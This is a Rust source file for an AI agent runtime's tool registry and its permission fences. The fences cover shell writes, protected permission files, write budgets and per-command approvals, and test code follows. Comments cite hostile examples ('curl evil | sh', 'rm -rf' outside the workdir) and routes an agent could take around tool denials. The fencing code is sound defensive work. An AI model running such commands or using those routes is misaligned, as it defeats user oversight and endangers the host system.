//! Unified tool registry combining built-in tools and MCP-discovered tools.

use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;

use leviath_mcp::{MCPClient, MCPServerConfig, ToolDiscovery, ToolExecutor};
use leviath_providers::Tool;
use leviath_tools::{BuiltinTools, ToolContext};

use crate::config::{Config, ToolPolicy};
use crate::credentials::McpGrants;

// The permission layers, and how they settle on a policy for a call, are the
// runtime's: a program that embeds it decides a call as this crate does.
use leviath_runtime::tool_policy::stricter;
pub(crate) use leviath_runtime::tool_policy::{
    blueprint_loosenable, clamp_raw_graph, default_tool_policy, launch_allows, resolve_policy,
    restrictiveness,
};

/// Combined tool registry: native built-in tools + MCP-discovered tools.
///
/// Cheap to clone (all fields are `Arc`s). The `call` method dispatches
/// to the appropriate executor.
pub(crate) struct ToolRegistry {
    /// The built-in tools, over this agent's workdir.
    #[cfg(test)]
    pub builtins: Arc<BuiltinTools>,
    /// The MCP executor, shared because connections are per-server rather than
    /// per-agent.
    pub mcp: Arc<Mutex<ToolExecutor>>,
    /// MCP tool definitions to advertise, resolved once at spawn.
    pub mcp_tool_defs: Vec<Tool>,
    /// Which server advertises each of those, for a stage that grants a whole
    /// connector. A `Tool` carries no owner, so this is the only record of it
    /// once the defs are flattened into one list.
    pub mcp_tool_owners: leviath_runtime::pipeline::ToolOwners,
    /// Which names dispatch to the built-ins rather than to MCP.
    #[cfg(test)]
    pub builtin_names: HashSet<String>,
}

impl ToolRegistry {
    /// Build a registry, connecting MCP servers declared in config (non-fatal).
    pub(crate) async fn build(workdir: PathBuf, config: &Config) -> Self {
        let ctx = ToolContext::new(workdir);
        let builtins = Arc::new(BuiltinTools::new(ctx));
        let builtin_names: HashSet<String> = builtins.names().into_iter().collect();

        let mut mcp_executor = ToolExecutor::new();
        let mut mcp_tool_defs: Vec<Tool> = Vec::new();

        if !config.mcp_servers.is_empty() {
            // Resolved once for the whole loop.
            let grants =
                agent_grants(config.security.credential_store).configured(&config.mcp_servers);
            for server_cfg in &config.mcp_servers {
                match connect_for_agent(server_cfg, &grants, &config.security.allow_env_vars).await
                {
                    Ok(client) => {
                        // Advertise under provider-safe, collision-free names,
                        // reserving the built-in names and every MCP name already
                        // advertised so nothing the LLM sees is duplicated or
                        // uses a character the provider rejects.
                        let mut reserved: HashSet<String> = builtin_names.clone();
                        reserved.extend(mcp_tool_defs.iter().map(|t| t.name.clone()));
                        // Under the launch spec's key, which is what the
                        // daemon's pool retires it by when the entry changes.
                        let advertised = mcp_executor.add_published(
                            server_cfg.connection_key(),
                            server_cfg.name.clone(),
                            client,
                            &reserved,
                        );
                        for meta in advertised {
                            mcp_tool_defs.push(Tool {
                                name: meta.name,
                                description: meta.description,
                                parameters: meta.schema,
                            });
                        }
                        tracing::info!(server = %server_cfg.name, "Connected MCP server");
                    }
                    Err(e) => {
                        let span = tracing::warn_span!(
                            "mcp_server_connect_failed",
                            server = tracing::field::Empty,
                            error = tracing::field::Empty
                        );
                        let _enter = span.enter();
                        span.record("server", tracing::field::display(&server_cfg.name));
                        span.record("error", tracing::field::display(&e));
                        tracing::warn!("Failed to connect MCP server - skipping");
                    }
                }
            }
        }

        // Read off the executor rather than accumulated alongside the loop
        // above: the executor is what actually assigned each advertised name,
        // so it cannot disagree with itself.
        let mcp_tool_owners = mcp_executor.tool_owners();
        Self {
            #[cfg(test)]
            builtins,
            mcp: Arc::new(Mutex::new(mcp_executor)),
            mcp_tool_defs,
            mcp_tool_owners,
            #[cfg(test)]
            builtin_names,
        }
    }

    /// All tool definitions to advertise to the LLM (built-ins + MCP + sub-agent).
    #[cfg(test)]
    pub(crate) fn all_tool_defs(&self) -> Vec<Tool> {
        let mut tools = self.builtins.tool_defs();
        tools.extend(BuiltinTools::subagent_tool_defs());
        tools.extend_from_slice(&self.mcp_tool_defs);
        tools
    }

    /// Shut down all MCP connections.
    #[cfg(test)]
    pub(crate) async fn shutdown(&self) {
        let mut mcp = self.mcp.lock().await;
        // `shutdown_all` always returns `Ok(())` in the current `leviath_mcp`
        // implementation (errors inside each client are silently discarded).
        // We discard the result here rather than branch on a gap that can
        // never be exercised without modifying `leviath-mcp` itself.
        let _ = mcp.shutdown_all().await;
    }
}

/// The MCP grants an agent connects with: `kind`'s, or the grant file alone
/// when the keychain cannot be reached, for the reason
/// [`McpGrants::at_or_file`] gives.
pub(crate) fn agent_grants(kind: leviath_core::CredentialStoreKind) -> McpGrants {
    McpGrants::at_or_file(
        leviath_mcp::AuthStore::default_path().unwrap_or_default(),
        kind,
    )
}

/// Connect `server` for an agent.
///
/// An HTTP server's stored OAuth token is sent as its bearer, refreshed first
/// if it has lapsed, and the client keeps a refresher so a run that outlives
/// the token re-auths on a 401 instead of failing every later call. A stdio
/// server, an unauthenticated one and one with a static `headers` token have
/// no grant and connect as they are. So does a server whose name has a grant
/// issued for a server at another URL: a token goes only where it was issued.
pub(crate) async fn connect_for_agent(
    server: &MCPServerConfig,
    grants: &McpGrants,
    allow_env: &[String],
) -> anyhow::Result<MCPClient> {
    let now = leviath_core::duration::now_secs_u64();
    let bearer = grants
        .authorization_header(server, now)
        .await
        .map_err(|e| anyhow::anyhow!("MCP auth unavailable: {e}"))?;
    let refreshes = bearer.is_some();
    let (_metas, mut client) = ToolDiscovery::new()
        .discover_from_config_with_auth(server, bearer, allow_env)
        .await?;
    if refreshes {
        client.set_refresher(Arc::new(grants.refresher(server)));
    }
    Ok(client)
}

/// Clamp a resolved policy by what the call *does*, as opposed to what it is
/// called.
///
/// A shell redirect writes a file. No tool name says so, so a `shell` call
/// carrying `> file` was answering only to the shell's policy, and
/// `write_file = "deny"` was bypassable with `echo x > file`. A model that
/// finds one tool refused should not be able to reach for another spelling of
/// it, so a call that writes is clamped by the write tool's own policy: denied
/// where writing is denied, and never quieter than writing would have been.
///
/// The clamp is one-directional. It can only make a call stricter, so a user
/// who allows `write_file` gains nothing they did not already have, and a
/// `shell = "deny"` still denies regardless of what the line writes.
///
/// `write_policy` is a closure rather than a value because this runs on every
/// tool call and almost none of them are a writing shell command: resolving the
/// write policy eagerly meant a `read_file` paid for a lookup whose result was
/// thrown away. `&dyn` rather than `impl` so there is one coverage-mapping
/// instance, matching the seam idiom used elsewhere in the workspace.
///
/// Takes a resolver rather than resolving `write_file` itself, so there is one
/// place that knows the layering and this is not it.
pub(crate) fn clamp_by_effect(
    tool_name: &str,
    arguments: &serde_json::Value,
    policy: ToolPolicy,
    write_policy: &dyn Fn() -> ToolPolicy,
) -> ToolPolicy {
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return policy;
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return policy;
    };
    if crate::shell_keys::writes_a_file(command) {
        return stricter(policy, write_policy());
    }
    policy
}

/// Refuse a shell call that writes outside the working directory, through a
/// redirect or through a program that writes the files its arguments name
/// (`rm`, `mkdir`, `cp`, `mv`, `tee`, ...: see `shell_keys::targets`), or
/// `None` when every target it names stays inside. A target the line cannot
/// place (a `cd` not followed, a variable, a glob that could reach anywhere)
/// is refused too: it is not a known escape, but it is not known to stay
/// inside either, and this is the fence.
///
/// [`clamp_by_effect`] answers "which policy governs this write" and is a
/// separate question from "is this path allowed at all". Folding them together
/// would hide the second one behind the first's name, so they stay apart.
///
/// **Refusal, not a prompt.** `write_file` does not prompt for a path outside
/// the workdir, it refuses, and this is the same write. Prompting would also be
/// unusable where it matters: the case this closes needs `write_file` to have
/// resolved to `Allow`, which in practice means `--yolo`, and
/// [`ToolPolicy::Ask`] blocks until answered - an unattended run would park in
/// `WaitingInput` holding its slot rather than being protected.
///
/// The message names the offending path and what writes it, so the model can
/// retry inside the workspace instead of guessing which part of its line was
/// refused.
///
/// Reads the target through [`crate::shell_keys`], which knows whether the
/// platform's shell treats `\` as an escape - so `> C:\Users\me\out.txt` on
/// Windows is judged as the path `cmd.exe` will actually open, rather than the
/// `C:Usersmeout.txt` a POSIX reading produces. That mismatch shipped once and
/// CI caught it denying a write *inside* the workspace.
pub(crate) fn escaping_write_refusal(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
) -> Option<String> {
    escaping_write_refusal_for(
        tool_name,
        arguments,
        workdir,
        crate::shell_keys::BACKSLASH_ESCAPES,
    )
}

/// [`escaping_write_refusal`] with the shell reading supplied, so both
/// platforms' fences are testable on either.
pub(crate) fn escaping_write_refusal_for(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
    backslash_escapes: bool,
) -> Option<String> {
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return None;
    }
    let command = arguments.get("command").and_then(|v| v.as_str())?;
    let home = crate::yolo::home();
    use crate::shell_keys::Landing;
    // A write the fence cannot place is treated as outside it. Leaving it to
    // the write policy instead shipped once: under a policy that allows
    // writes (`--yolo`, an autonomous profile) the question is answered yes,
    // and `cd /tmp && rm -rf x && mkdir x` ran outside the workdir.
    let targets = match crate::shell_keys::landing_for(
        command,
        backslash_escapes,
        workdir,
        home.as_deref(),
    ) {
        Landing::Known(targets) => targets,
        Landing::Unnamed => {
            return Some(
                "[denied] This shell line writes to a path only the shell can name (a variable \
                 or a substitution: `> $OUT`, `rm -rf $DIR`, `cp a $(pwd)/b`), so where it \
                 writes cannot be checked against the working directory. Name the path \
                 literally, or use the `write_file` tool."
                    .to_string(),
            );
        }
        Landing::Lost => {
            return Some(
                "[denied] This shell line writes to a relative path after a move that cannot be \
                 followed (a `cd` to a variable or `-`, or behind `{`, `!`, `then`, `command` \
                 or an assignment, `popd`, `CDPATH`, `.`, `source` or `eval`), or through a \
                 glob, brace list or `~user` that could reach anywhere, so where it writes \
                 cannot be checked against the working directory. Write to a path from the \
                 workdir on a line that does not move, or use the `write_file` tool."
                    .to_string(),
            );
        }
        // Refused even when the redirect would land inside the tree: "inside"
        // is a judgement about a path this could not read, and the fence is
        // only as good as what it can read.
        Landing::Unparsed => {
            return Some(
                "[denied] This shell line redirects with `>` inside a construct that cannot be \
                 read ahead of time (a backtick, an unterminated quote, an unbalanced `$(`, or \
                 a heredoc whose body never ends or would expand a substitution), so where it \
                 writes cannot be checked against the working directory. Use the `write_file` \
                 tool, or rewrite the line without that construct."
                    .to_string(),
            );
        }
    };
    let (target, landed) = targets.iter().find_map(|t| {
        let out = t
            .lands
            .iter()
            .find(|l| !leviath_core::resolves_within(l, workdir))?;
        Some((t, out))
    })?;
    let by = match target.by.as_str() {
        crate::shell_keys::REDIRECT => "redirect".to_string(),
        program => format!("`{program}`"),
    };
    Some(format!(
        "[denied] Shell {by} writes to '{}', which may land at '{}', outside the working \
         directory ({}). The `write_file` tool refuses the same path; the shell is not a way \
         around it. Write inside the workspace instead.",
        target.written,
        landed.display(),
        workdir.display()
    ))
}

/// What a `shell` call names outside the workdir, as far as the read fence
/// `may_read` says (`BuiltinTools::may_read`: the workdir, then granted
/// `[read_paths]`). Empty for any other tool.
///
/// The keys it returns are ones the safe list must not cover; the call as a
/// whole answers to the `outside_workdir` permission too, which refuses it
/// when set to `deny`.
pub(crate) fn outside_workdir(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
    may_read: &dyn Fn(&std::path::Path) -> bool,
) -> crate::shell_keys::Outside {
    let command = match leviath_tools::canonical_tool_name(tool_name) {
        "shell" => arguments.get("command").and_then(|v| v.as_str()),
        _ => None,
    };
    match command {
        Some(command) => crate::shell_keys::outside_workdir(
            command,
            workdir,
            crate::yolo::home().as_deref(),
            may_read,
        ),
        None => crate::shell_keys::Outside::default(),
    }
}

/// The refusal for a shell call [`outside_workdir`] flagged while the
/// `outside_workdir` permission is `deny`.
///
/// Says what was outside and what to do instead, so the model retries inside
/// the workspace rather than hunting for another spelling.
pub(crate) fn outside_workdir_refusal(why: &str, workdir: &std::path::Path) -> String {
    format!(
        "[denied] This shell line may read outside the working directory ({}): {why}. Reads \
         outside the workdir are refused for this stage (`outside_workdir = \"deny\"`), and so \
         is a line whose reads cannot be checked. Use plain paths inside the workspace, or the \
         read_file, search_files and glob tools.",
        workdir.display(),
    )
}

/// A file or directory a run may not change: one of the places that decide
/// what agents may do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct ProtectedPath {
    pub path: std::path::PathBuf,
    /// What it is, for the refusal.
    pub label: &'static str,
}

/// The places `[security] lock_permission_files` keeps a run's tools out of,
/// or nothing when it is off.
///
/// Each is either where a permission is granted (`config.toml`, `yolo.toml`,
/// the taint policy and its rules), what types the files a run is handed
/// (`mime_types.toml`), or code every later run executes (the provider and
/// tool scripts). Writing any of them from inside a run is an
/// agent changing what the next spawn will let it do.
pub(crate) fn permission_files(config: &Config) -> Vec<ProtectedPath> {
    if !config.security.lock_permission_files {
        return Vec::new();
    }
    let mut out = vec![
        ProtectedPath {
            path: Config::config_path(),
            label: "config.toml",
        },
        ProtectedPath {
            path: crate::yolo::yolo_path(),
            label: "yolo.toml",
        },
        ProtectedPath {
            path: crate::config::mime_types_path(),
            label: "mime_types.toml",
        },
    ];
    out.extend(
        crate::commands::policy::policy_path()
            .ok()
            .map(|path| ProtectedPath {
                path,
                label: "the taint policy",
            }),
    );
    out.extend(
        crate::commands::policy::rules_dir()
            .ok()
            .map(|path| ProtectedPath {
                path,
                label: "the taint-gate rules",
            }),
    );
    out.extend(leviath_core::providers_dir().map(|path| ProtectedPath {
        path,
        label: "the provider scripts",
    }));
    out.extend(leviath_core::tools_dir().map(|path| ProtectedPath {
        path,
        label: "the global tool scripts",
    }));
    out
}

/// Refuse a call that would write one of `protected`, or `None` when it
/// touches none of them.
///
/// Checked before policy, `--yolo` or not: this is containment, like the
/// redirect fence beside it, and no permission makes it allowed. `write_file`
/// and `edit_file` are judged by their `path`. A shell line is judged by every
/// word and redirect target that resolves into a protected place, with a `cd`
/// earlier in the line moving where relative words resolve, and then by its
/// raw text against each protected location's spellings (`~/...`,
/// `$HOME/...`), which is what a quoted script or a heredoc carries. Reads
/// through the shell are refused with the writes, because the shell does not
/// say which a program does; `read_file` and `list_dir` are untouched.
pub(crate) fn protected_path_refusal(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
    home: Option<&std::path::Path>,
    protected: &[ProtectedPath],
) -> Option<String> {
    if protected.is_empty() {
        return None;
    }
    match leviath_tools::canonical_tool_name(tool_name) {
        "write_file" | "edit_file" => {
            let path = arguments.get("path")?.as_str()?;
            let hit = protected_hit(path, workdir, home, protected)?;
            Some(protected_refusal(path, hit))
        }
        "shell" => {
            let command = arguments.get("command")?.as_str()?;
            shell_protected_refusal(command, workdir, home, protected)
        }
        _ => None,
    }
}

/// The protected place `word` names, if any, once `~` is expanded, a
/// relative path is joined to `cwd`, `..` is folded, and symlinks are
/// followed as far as the path exists: the same resolution a yolo rule
/// gives a word, so the two cannot read one path two ways.
fn protected_hit<'a>(
    word: &str,
    cwd: &std::path::Path,
    home: Option<&std::path::Path>,
    protected: &'a [ProtectedPath],
) -> Option<&'a ProtectedPath> {
    let expanded = leviath_core::paths::expand_home(word, home)?;
    let joined = match expanded.is_absolute() {
        true => expanded,
        false => cwd.join(expanded),
    };
    // Folded before canonicalising, so a `..` in a tail that does not exist
    // yet cannot survive into the comparison. Both sides then go through the
    // same resolution: a protected file that does not exist yet (`yolo.toml`
    // before `lev yolo init`) still has an existing parent whose symlinks
    // decide what it really names.
    let folded = leviath_core::paths::fold_dot_dot(&joined)?;
    let target = leviath_core::canonicalize_for_match(&folded)?;
    // A protected place nothing along which exists cannot be named by any
    // real path either, so it matches nothing.
    protected.iter().find(|p| {
        leviath_core::canonicalize_for_match(&p.path).is_some_and(|root| target.starts_with(root))
    })
}

/// [`protected_path_refusal`] for a shell line.
fn shell_protected_refusal(
    command: &str,
    workdir: &std::path::Path,
    home: Option<&std::path::Path>,
    protected: &[ProtectedPath],
) -> Option<String> {
    if let Some(segments) =
        crate::shell_keys::matchable_segments(command, crate::shell_keys::BACKSLASH_ESCAPES)
    {
        let mut cwd = workdir.to_path_buf();
        for segment in &segments {
            for word in &segment.words {
                if let Some(hit) = protected_hit(word, &cwd, home, protected) {
                    return Some(protected_refusal(word, hit));
                }
            }
            // `cd` moves where the rest of the line's relative words land.
            if let [program, target, ..] = segment.words.as_slice()
                && program == "cd"
                && let Some(next) = leviath_core::paths::expand_home(target, home)
            {
                cwd = match next.is_absolute() {
                    true => next,
                    false => cwd.join(next),
                };
            }
        }
    }
    for target in crate::shell_keys::write_target_paths(command) {
        if let Some(hit) = protected_hit(&target, workdir, home, protected) {
            return Some(protected_refusal(&target, hit));
        }
    }
    // Text the reader cannot place - a quoted script, an expansion, a
    // heredoc body - still spells the location out, so that is what is
    // checked there.
    for p in protected {
        for spelling in location_spellings(&p.path, home) {
            if command.contains(&spelling) {
                return Some(protected_refusal(&spelling, p));
            }
        }
    }
    None
}

/// The ways a shell line spells `path`: as written, and through the home
/// directory as `~/...`, `$HOME/...` and `${HOME}/...`.
fn location_spellings(path: &std::path::Path, home: Option<&std::path::Path>) -> Vec<String> {
    // Both separators, always: a shell line writes `/` on every OS, and on
    // Windows the native form has `\`. Emitting both unconditionally rather
    // than by platform keeps this one function with one set of regions; a
    // duplicate spelling costs a `contains` and nothing else.
    let absolute = path.to_string_lossy().into_owned();
    let mut spellings = vec![absolute.replace('\\', "/"), absolute];
    if let Some(rest) = home.and_then(|h| path.strip_prefix(h).ok()) {
        let native = rest.to_string_lossy().into_owned();
        let slashed = native.replace('\\', "/");
        for prefix in ["~", "$HOME", "${HOME}"] {
            spellings.push(format!("{prefix}/{slashed}"));
            spellings.push(format!("{prefix}/{native}"));
        }
    }
    spellings
}

fn protected_refusal(shown: &str, hit: &ProtectedPath) -> String {
    format!(
        "[denied] '{shown}' is {} ({}), one of the files that decide what agents may do, and a \
         run may not change it. Edit it yourself, or turn off `[security] \
         lock_permission_files` in config.toml.",
        hit.label,
        hit.path.display()
    )
}

/// How many bytes this call declares it will write, when that is knowable
/// before it runs.
///
/// `write_file` and `edit_file` carry their content as an argument, so the
/// figure is exact and the call can be stopped before a byte lands. A shell
/// redirect cannot be: the bytes go from the shell to the file without passing
/// through Leviath, so `None` here means "unknown, measure afterwards" rather
/// than "writes nothing".
pub(crate) fn declared_write_bytes(tool_name: &str, arguments: &serde_json::Value) -> Option<u64> {
    let field = match leviath_tools::canonical_tool_name(tool_name) {
        "write_file" => "content",
        "edit_file" => "new_str",
        // The script lands in the global tools directory, not the workdir, so
        // the free-space probe (which looks at the workdir's volume) is an
        // approximation when the two are on different disks. The byte ceiling
        // is exact either way.
        "install_self_tool" | "install_global_tool" => "source",
        _ => return None,
    };
    arguments
        .get(field)
        .and_then(|v| v.as_str())
        .map(|s| s.len() as u64)
}

/// Refuse a call that would take the run past a write ceiling, or fill the disk,
/// for a run that has written `written` so far.
///
/// Returns the refusal, or `None` to proceed.
///
/// Two shapes of call reach here and they are not symmetric. A `write_file`
/// declares its size, so it is judged before it runs and nothing is written. A
/// shell redirect does not, so it is judged on what the run has *already*
/// spent - which stops the call after the one that overran, not the one that
/// did. That asymmetry is inherent: Leviath never sees those bytes, and the
/// alternative is refusing every redirect on a run near its budget.
///
/// The disk check applies to both, and to a shell call with any write target at
/// all: a machine with no room left should not be handed a command that writes,
/// whatever its size turns out to be.
pub(crate) fn write_budget_refusal(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
    budget: &crate::daemon::tool_service::WriteBudget,
    written: u64,
) -> Option<String> {
    let declared = declared_write_bytes(tool_name, arguments);
    let writes_something = declared.is_some()
        || (leviath_tools::canonical_tool_name(tool_name) == "shell"
            && arguments
                .get("command")
                .and_then(|v| v.as_str())
                .is_some_and(crate::shell_keys::writes_a_file));
    if !writes_something {
        return None;
    }
    budget
        .check_at(workdir, written, declared.unwrap_or(0))
        .refusal()
}

/// How many bytes a *finished* shell call put on disk, for charging the run's
/// budget.
///
/// The current size of every literal redirect target, measured now that the
/// command has run - which is the only moment those bytes are visible to
/// Leviath at all.
///
/// Zero for a declaring tool. Those are charged when they are checked, before
/// the batch runs: a batch's calls are all authorized before any of them
/// execute, so a per-run budget charged only afterwards would let every call in
/// one batch check against a budget none of them had spent yet. Charging a
/// known size up front is what makes the second write in a two-write batch see
/// the first.
///
/// A target that no longer exists, or was never created, contributes nothing: a
/// command that failed should not spend the run's budget on a file it did not
/// write.
pub(crate) fn measured_write_bytes(
    tool_name: &str,
    arguments: &serde_json::Value,
    workdir: &std::path::Path,
) -> u64 {
    if declared_write_bytes(tool_name, arguments).is_some() {
        return 0;
    }
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return 0;
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return 0;
    };
    crate::shell_keys::write_target_paths(command)
        .into_iter()
        .map(|target| {
            std::fs::metadata(target_path(&target, workdir))
                .map(|m| m.len())
                .unwrap_or(0)
        })
        .sum()
}

/// Where a shell redirect target lands: an absolute target as written, a
/// relative one against the working directory the shell runs in.
fn target_path(target: &str, workdir: &std::path::Path) -> std::path::PathBuf {
    match std::path::Path::new(target).is_absolute() {
        true => std::path::PathBuf::from(target),
        false => workdir.join(target),
    }
}

/// The keys a scoped approval ("allow for this stage", "allow for this run") is
/// remembered under. Empty means this call must not be granted beyond itself.
///
/// Keying approval on the bare tool name would make approving one `shell` call
/// approve *every* later `shell` call. "Allow `ls`" silently becomes "allow
/// `curl evil | sh`" - the user consents to one thing and grants another.
///
/// So a shell approval is keyed on what actually runs, one key per command in
/// the line, and a later call is covered only when **every** command in it is
/// already covered. See [`crate::shell_keys`] for how a line is read.
///
/// Non-shell tools keep keying on the tool name: their arguments do not widen
/// what the tool can reach the way a command string does.
pub(crate) fn session_approval_keys(tool_name: &str, arguments: &serde_json::Value) -> Vec<String> {
    // A call that is not a shell line has one key, the runtime's: the tool's
    // name, or the raw-graph permission for a spawn that carries a graph.
    if let Some(key) = leviath_runtime::tool_policy::approval_key(tool_name, arguments) {
        return vec![key];
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return Vec::new();
    };
    crate::shell_keys::command_keys(command)
}

#[cfg(test)]
mod mcp_registry_tests {
    use super::*;
    use crate::test_support::with_tracing;
    use leviath_mcp::MCPServerConfig;

    // A minimal MCP server speaking just enough JSON-RPC over stdio to
    // satisfy `initialize` / `notifications/initialized` / `tools/list`,
    // mirroring `leviath-mcp/src/discovery.rs`'s own `STUB_INIT_AND_LIST`
    // test fixture - a real (but fast, local, no-network) subprocess round
    // trip rather than a fake/mocked `ToolExecutor`.
    const STUB_INIT_AND_LIST: &str = r#"
import sys, json

def respond(id, result):
    msg = json.dumps({"jsonrpc": "2.0", "id": id, "result": result})
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    req = json.loads(line)
    method = req.get("method", "")
    id_ = req.get("id")
    if method == "initialize":
        respond(id_, {"capabilities": {"tools": {"listChanged": True}}, "protocolVersion": "2024-11-05"})
    elif method == "notifications/initialized":
        pass
    elif method == "tools/list":
        respond(id_, {"tools": [{"name": "echo", "description": "echo tool", "inputSchema": {}}]})
    elif method == "tools/call":
        args = req.get("params", {}).get("arguments", {})
        if args.get("fail"):
            respond(id_, {"content": [{"type": "text", "text": "it broke"}], "isError": True})
        else:
            respond(id_, {"content": [{"type": "text", "text": "echoed!"}], "isError": False})
    else:
        respond(id_, {"error": {"code": -32601, "message": "method not found"}})
"#;

    fn config_with_mcp_server(command: &str, args: Vec<&str>) -> Config {
        Config {
            mcp_servers: vec![MCPServerConfig::stdio(
                "stub-server",
                command,
                args.into_iter().map(String::from).collect(),
            )],
            ..Config::default()
        }
    }

    /// Run `body` with `LEVIATH_HOME` pointed at a fresh temp dir, so the MCP
    /// auth store resolves to an empty, hermetic location rather than the real
    /// `~/.leviath`.
    async fn with_temp_home<F, Fut, T>(body: F) -> T
    where
        F: FnOnce() -> Fut,
        Fut: std::future::Future<Output = T>,
    {
        let dir = tempfile::tempdir().unwrap();
        temp_env::async_with_vars(
            [("LEVIATH_HOME", Some(dir.path().to_str().unwrap()))],
            body(),
        )
        .await
    }

    #[tokio::test]
    async fn build_connects_mcp_server_and_registers_its_tools() {
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("python3", vec!["-c", STUB_INIT_AND_LIST]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "stub-server__echo");

        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_advertises_two_servers_under_their_own_names() {
        // Two stdio servers each exposing an `echo` tool. Both are advertised
        // server-qualified, so the LLM never sees a duplicate and neither name
        // depends on config order. The reserved-name closure (which reads
        // already-advertised names) still runs on the second server.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = Config {
                mcp_servers: vec![
                    MCPServerConfig::stdio(
                        "alpha",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                    MCPServerConfig::stdio(
                        "beta",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                ],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        let names: Vec<&str> = registry
            .mcp_tool_defs
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        // Both are server-qualified: neither keeps the bare `echo`, so which
        // server registered first does not decide who owns the plain name.
        assert!(names.contains(&"alpha__echo"), "names: {names:?}");
        assert!(names.contains(&"beta__echo"), "names: {names:?}");
        registry.shutdown().await;
    }

    /// A minimal streamable-HTTP MCP server that requires a bearer and lists one
    /// tool. Returns its base URL.
    async fn mock_http_mcp_server() -> String {
        use axum::response::IntoResponse;
        use axum::routing::post;
        use axum::{Json, Router};
        let listener = leviath_testkit::bind_local().await;
        let base = format!("http://{}", listener.local_addr().unwrap());
        let app = Router::new().route(
            "/mcp",
            // The token is validated by the daemon-side resolution, not here;
            // this mock only needs to speak enough protocol to connect.
            post(|body: String| async move {
                let req: serde_json::Value = serde_json::from_str(&body).unwrap();
                let id = req.get("id").cloned().unwrap_or(serde_json::json!(1));
                let result = match req.get("method").and_then(|m| m.as_str()) {
                    Some("initialize") => {
                        serde_json::json!({"capabilities": {}, "protocolVersion": "2024-11-05"})
                    }
                    Some("tools/list") => {
                        serde_json::json!({"tools": [{"name": "remote_tool", "inputSchema": {}}]})
                    }
                    _ => serde_json::json!({}),
                };
                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    Json(serde_json::json!({"jsonrpc": "2.0", "id": id, "result": result}))
                        .into_response()
                        .into_body(),
                )
                    .into_response()
            }),
        );
        tokio::spawn(std::future::IntoFuture::into_future(axum::serve(
            listener, app,
        )));
        base
    }

    /// The `Authorization` header of each request a recording server saw.
    type SeenHeaders = Arc<std::sync::Mutex<Vec<Option<axum::http::HeaderValue>>>>;

    /// A streamable-HTTP MCP server that needs no auth and records the
    /// `Authorization` header of every request it is sent. Returns its base URL
    /// and the record.
    async fn recording_http_mcp_server() -> (String, SeenHeaders) {
        use axum::http::HeaderMap;
        use axum::response::IntoResponse;
        use axum::routing::post;
        use axum::{Json, Router};
        let seen = SeenHeaders::default();
        let record = seen.clone();
        let listener = leviath_testkit::bind_local().await;
        let base = format!("http://{}", listener.local_addr().unwrap());
        let app = Router::new().route(
            "/mcp",
            post(move |headers: HeaderMap, body: String| {
                let record = record.clone();
                async move {
                    record
                        .lock()
                        .unwrap()
                        .push(headers.get("authorization").cloned());
                    let req: serde_json::Value = serde_json::from_str(&body).unwrap();
                    let id = req.get("id").cloned().unwrap_or(serde_json::json!(1));
                    let result = match req.get("method").and_then(|m| m.as_str()) {
                        Some("initialize") => serde_json::json!({
                            "capabilities": {}, "protocolVersion": "2024-11-05"
                        }),
                        Some("tools/list") => serde_json::json!({
                            "tools": [{"name": "ping", "inputSchema": {}}]
                        }),
                        _ => serde_json::json!({}),
                    };
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        Json(serde_json::json!({"jsonrpc": "2.0", "id": id, "result": result})),
                    )
                        .into_response()
                }
            }),
        );
        tokio::spawn(std::future::IntoFuture::into_future(axum::serve(
            listener, app,
        )));
        (base, seen)
    }

    /// A grant stored for one server is never sent to another that merely
    /// shares its name: a blueprint declaring its own `github` at a URL of its
    /// choosing gets no token, and still connects.
    #[tokio::test]
    async fn a_grant_is_not_sent_to_a_same_named_server_at_another_url() {
        let (impostor, seen) = recording_http_mcp_server().await;
        let dir = tempfile::tempdir().unwrap();
        let grants = McpGrants::at(
            dir.path().join("mcp-auth.json"),
            leviath_core::CredentialStoreKind::File,
        );
        grants
            .set(
                "github",
                leviath_mcp::ServerAuth {
                    resource: "https://mcp.example.test/mcp".to_string(),
                    access_token: "the-users-token".to_string(),
                    expires_at: u64::MAX,
                    ..Default::default()
                },
            )
            .unwrap();

        let blueprint_server = MCPServerConfig::http("github", format!("{impostor}/mcp"));
        let mut client = connect_for_agent(&blueprint_server, &grants, &[])
            .await
            .expect("an open server connects without the grant");
        let _ = client.shutdown().await;

        let seen = seen.lock().unwrap().clone();
        assert!(!seen.is_empty(), "the server was reached");
        assert!(
            seen.iter().all(Option::is_none),
            "no Authorization header may reach another server: {seen:?}"
        );
    }

    #[tokio::test]
    async fn build_attaches_a_refresher_to_an_authenticated_http_server() {
        // An HTTP server with a live stored token connects, its tool is
        // advertised, and a refresher is attached (the auth-resolved arm).
        with_tracing(|| {});
        let base = mock_http_mcp_server().await;
        let registry = with_temp_home(|| async {
            // Seed a non-expired token at the store the daemon reads.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
